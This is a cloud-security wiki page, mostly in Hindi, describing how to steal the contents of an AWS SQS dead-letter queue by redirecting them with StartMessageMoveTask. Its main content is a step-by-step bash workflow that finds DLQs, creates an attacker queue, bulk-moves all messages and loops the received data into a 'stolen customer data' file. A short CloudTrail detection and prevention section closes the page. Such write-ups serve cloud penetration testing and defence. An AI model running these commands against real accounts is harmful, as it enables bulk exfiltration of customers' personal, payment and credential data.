# AWS – SQS DLQ Redrive Exfiltration via StartMessageMoveTask

## विवरण

SQS message move tasks का दुरुपयोग करके पीड़ित के Dead-Letter Queue (DLQ) में जमा किए गए सभी संदेशों को `sqs:StartMessageMoveTask` का उपयोग करके हमलावर-नियंत्रित queue पर रीडायरेक्ट करके चुराना। यह तकनीक AWS के वैध message recovery फीचर का फायदा उठाकर DLQs में समय के साथ जमा संवेदनशील डेटा को exfiltrate करती है।

## Dead-Letter Queue (DLQ) क्या है?

Dead-Letter Queue एक विशेष SQS queue है जहाँ संदेश स्वचालित रूप से भेजे जाते हैं जब उन्हें मुख्य application द्वारा सफलतापूर्वक प्रोसेस नहीं किया जा सकता। ये विफल संदेश अक्सर निम्नलिखित रखते हैं:
- संवेदनशील application डेटा जिसे प्रोसेस नहीं किया जा सका
- त्रुटि विवरण और डिबग जानकारी
- व्यक्तिगत पहचान योग्य जानकारी (PII)
- API tokens, credentials, या अन्य secrets
- व्यापार-सम्बंधी महत्वपूर्ण transaction डेटा

DLQs उन विफल संदेशों का "कब्रिस्तान" जैसा काम करते हैं, इसलिए ये कीमती लक्ष्य होते हैं क्योंकि इनमें समय के साथ ऐसा संवेदनशील डेटा जमा हो जाता है जिसे applications सही तरीके से हैंडल नहीं कर पाए।

## हमला परिदृश्य

**वास्तविक उदाहरण:**
1. **E-commerce application** SQS के माध्यम से ग्राहक आदेश प्रोसेस करती है  
2. **कुछ आदेश विफल होते हैं** (payment issues, inventory problems, आदि) और DLQ में चले जाते हैं  
3. **DLQ में जमा होता है** हफ्तों/महीनों का विफल ऑर्डर डेटा जिसमें ग्राहक जानकारी होती है: `{"customerId": "12345", "creditCard": "4111-1111-1111-1111", "orderTotal": "$500"}`  
4. **Attacker AWS credentials** हासिल कर लेता है जिनमें SQS permissions होते हैं  
5. **Attacker पता लगाता है** कि DLQ में हजारों विफल ऑर्डर्स हैं जिनमें संवेदनशील डेटा है  
6. **व्यक्ति व्यक्तिगत संदेशों तक पहुँचने की बजाय** (धीमा और स्पष्ट), attacker `StartMessageMoveTask` का उपयोग करके सभी संदेशों को एक साथ अपनी queue में bulk transfer कर देता है  
7. **Attacker एक ही ऑपरेशन में** सभी ऐतिहासिक संवेदनशील डेटा निकाल लेता है

## आवश्यकताएँ
- स्रोत queue को किसी न किसी queue के RedrivePolicy द्वारा DLQ के रूप में कॉन्फ़िगर किया गया होना चाहिए।
- IAM permissions (समझौता किए गए victim principal के रूप में चलाते हुए):
- DLQ (source) पर: `sqs:StartMessageMoveTask`, `sqs:GetQueueAttributes`.
- destination queue पर: संदेश डिलीवर करने की अनुमति (उदा., queue policy जो victim principal से `sqs:SendMessage` की अनुमति देती हो)। same-account destinations के लिए यह सामान्यतः डिफ़ॉल्ट रूप से allowed होता है।
- यदि SSE-KMS सक्षम है: source CMK पर `kms:Decrypt`, और destination CMK पर `kms:GenerateDataKey`, `kms:Encrypt`.

## प्रभाव
DLQs में जमा संवेदनशील payloads (विफल events, PII, tokens, application payloads) को native SQS APIs का उपयोग करके उच्च गति पर exfiltrate किया जा सकता है। यदि destination queue policy victim principal से `SendMessage` की अनुमति देती है तो यह cross-account भी काम करता है।

## दुरुपयोग कैसे करें

- पीड़ित DLQ ARN की पहचान करें और सुनिश्चित करें कि इसे वास्तव में किसी queue द्वारा DLQ के रूप में संदर्भित किया गया है (कोई भी queue चलेगा)।
- एक attacker-नियंत्रित destination queue बनाएं या चुनें और उसका ARN प्राप्त करें।
- पीड़ित DLQ से आपकी destination queue पर message move task शुरू करें।
- प्रगति की निगरानी करें या आवश्यक होने पर task को रद्द करें।

### CLI उदाहरण: E-commerce DLQ से Customer Data का Exfiltration

**परिदृश्य**: एक attacker ने AWS credentials compromise कर ली हैं और पता लगा लिया है कि एक e-commerce application SQS का उपयोग कर रही है और उसकी DLQ में ग्राहक ऑर्डर प्रोसेसिंग के विफल प्रयास जमा हैं।

1) **Discover and examine the victim DLQ**
```bash
# List queues to find DLQs (look for names containing 'dlq', 'dead', 'failed', etc.)
aws sqs list-queues --queue-name-prefix dlq

# Let's say we found: https://sqs.us-east-1.amazonaws.com/123456789012/ecommerce-orders-dlq
VICTIM_DLQ_URL="https://sqs.us-east-1.amazonaws.com/123456789012/ecommerce-orders-dlq"
SRC_ARN=$(aws sqs get-queue-attributes --queue-url "$VICTIM_DLQ_URL" --attribute-names QueueArn --query Attributes.QueueArn --output text)

# Check how many messages are in the DLQ (potential treasure trove!)
aws sqs get-queue-attributes --queue-url "$VICTIM_DLQ_URL" \
--attribute-names ApproximateNumberOfMessages
# Output might show: "ApproximateNumberOfMessages": "1847"
```
2) **बनाएँ attacker-controlled destination queue**
```bash
# Create our exfiltration queue
ATTACKER_Q_URL=$(aws sqs create-queue --queue-name hacker-exfil-$(date +%s) --query QueueUrl --output text)
ATTACKER_Q_ARN=$(aws sqs get-queue-attributes --queue-url "$ATTACKER_Q_URL" --attribute-names QueueArn --query Attributes.QueueArn --output text)

echo "Created exfiltration queue: $ATTACKER_Q_ARN"
```
3) **बड़े पैमाने पर संदेश चोरी को निष्पादित करें**
```bash
# Start moving ALL messages from victim DLQ to our queue
# This operation will transfer thousands of failed orders containing customer data
echo "Starting bulk exfiltration of $SRC_ARN to $ATTACKER_Q_ARN"
TASK_RESPONSE=$(aws sqs start-message-move-task \
--source-arn "$SRC_ARN" \
--destination-arn "$ATTACKER_Q_ARN" \
--max-number-of-messages-per-second 100)

echo "Move task started: $TASK_RESPONSE"

# Monitor the theft progress
aws sqs list-message-move-tasks --source-arn "$SRC_ARN" --max-results 10
```
4) **चोरी किए गए संवेदनशील डेटा को एकत्र करें**
```bash
# Receive the exfiltrated customer data
echo "Receiving stolen customer data..."
aws sqs receive-message --queue-url "$ATTACKER_Q_URL" \
--attribute-names All --message-attribute-names All \
--max-number-of-messages 10 --wait-time-seconds 5

# Example of what an attacker might see:
# {
#   "Body": "{\"customerId\":\"cust_12345\",\"email\":\"john@example.com\",\"creditCard\":\"4111-1111-1111-1111\",\"orderTotal\":\"$299.99\",\"failureReason\":\"Payment declined\"}",
#   "MessageId": "12345-abcd-6789-efgh"
# }

# Continue receiving all messages in batches
while true; do
MESSAGES=$(aws sqs receive-message --queue-url "$ATTACKER_Q_URL" \
--max-number-of-messages 10 --wait-time-seconds 2 --output json)

if [ "$(echo "$MESSAGES" | jq '.Messages | length')" -eq 0 ]; then
echo "No more messages - exfiltration complete!"
break
fi

echo "Received batch of stolen data..."
# Process/save the stolen customer data
echo "$MESSAGES" >> stolen_customer_data.json
done
```
### क्रॉस-एकाउंट नोट्स
- The destination queue must have a resource policy allowing the victim principal to `sqs:SendMessage` (and, if used, KMS grants/permissions).

## यह Attack क्यों प्रभावी है

1. **Legitimate AWS Feature**: बिल्ट-इन AWS कार्यक्षमता का उपयोग करता है, जो इसे दुर्भावनापूर्ण के रूप में पहचानना कठिन बनाती है
2. **Bulk Operation**: धीमे व्यक्तिगत एक्सेस के बजाय हजारों messages जल्दी ट्रांसफर करता है
3. **Historical Data**: DLQs सप्ताहों/महीनों में संवेदनशील डेटा जमा कर लेते हैं
4. **Under the Radar**: कई संगठन DLQ access की निगरानी बारीकी से नहीं करते हैं
5. **Cross-Account Capable**: यदि permissions अनुमति दें तो attacker अपने ही AWS account में exfiltrate कर सकता है

## Detection and Prevention

### Detection
संदिग्ध `StartMessageMoveTask` API कॉल्स के लिए CloudTrail की निगरानी करें:
```json
{
"eventName": "StartMessageMoveTask",
"sourceIPAddress": "suspicious-ip",
"userIdentity": {
"type": "IAMUser",
"userName": "compromised-user"
},
"requestParameters": {
"sourceArn": "arn:aws:sqs:us-east-1:123456789012:sensitive-dlq",
"destinationArn": "arn:aws:sqs:us-east-1:attacker-account:exfil-queue"
}
}
```
### रोकथाम
1. **न्यूनतम विशेषाधिकार**: `sqs:StartMessageMoveTask` अनुमतियों को केवल आवश्यक भूमिकाओं तक सीमित करें  
2. **DLQs की निगरानी**: असामान्य DLQ गतिविधि के लिए CloudWatch अलार्म सेट करें  
3. **क्रॉस-एकाउंट नीतियाँ**: cross-account access की अनुमति देने वाली SQS queue नीतियों की सावधानीपूर्वक समीक्षा करें  
4. **DLQs को एन्क्रिप्ट करें**: सीमित key नीतियों के साथ SSE-KMS का उपयोग करें  
5. **नियमित क्लीनअप**: संवेदनशील डेटा को DLQs में अनिश्चितकाल तक जमा न होने दें
